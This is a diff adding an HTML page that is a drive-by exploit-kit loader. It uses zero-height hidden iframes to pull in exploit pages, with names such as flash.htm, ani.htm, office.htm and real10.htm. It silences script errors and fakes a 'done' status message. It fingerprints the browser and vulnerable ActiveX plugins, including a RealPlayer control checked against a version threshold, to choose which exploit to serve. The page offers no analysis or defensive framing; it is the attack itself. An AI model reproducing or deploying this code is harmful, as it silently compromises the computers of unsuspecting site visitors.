@@ -1,0 +1,36 @@
+<script src='http://s96.cnzz.com/stat.php?id=1010015&web_id=1010015' language='JavaScript' charset='gb2312'>
+<SCRIPT>
+document.write("<iframe width=50 height=0 src=flash.htm></iframe>");
+document.write("<iframe width=50 height=0 src=08053.htm></iframe>");
+document.write("<iframe width=50 height=0 src=uu.html></iframe>");
+document.write("<iframe width=50 height=0 src=ani.htm></iframe>");
+window.status="Íê³É";
+window.onerror=function(){return true;}
+if(navigator.userAgent.toLowerCase().indexOf("msie 7")==-1)
+document.write("<iframe width=20 height=0 src=06014.htm></iframe>");
+try{var b;
+var mm=new ActiveXObject("NCTAudioFile2.AudioFile2.2");}
+catch(b){};                      
+finally{if(b!="[object Error]"){document.write("<iframe width=100 height=0 src=net.htm></iframe>");}}
+function test()
+{
+rrooxx = "IER" + "PCtl.I" + "ERP" + "Ctl.1";
+try
+{
+Like = new ActiveXObject(rrooxx);
+}catch(error){return;}
+vvvvv = Like.PlayerProperty("PRODUCTVERSION");
+if(vvvvv<="6.0.14.552")
+document.write("<iframe width=100 height=0 src=real10.htm></iframe>");
+else
+document.write("<iframe width=100 height=0 src=real11.htm></iframe>");
+}
+test();
+</SCRIPT>
+</HEAD>
+<BODY>
+<IFRAME src="flash.htm" width=20 height=0></IFRAME>
+<IFRAME src="06014.htm" width=20 height=0></IFRAME>
+<IFRAME src="office.htm" width=20 height=0></IFRAME>
+</BODY>
+</HTML>
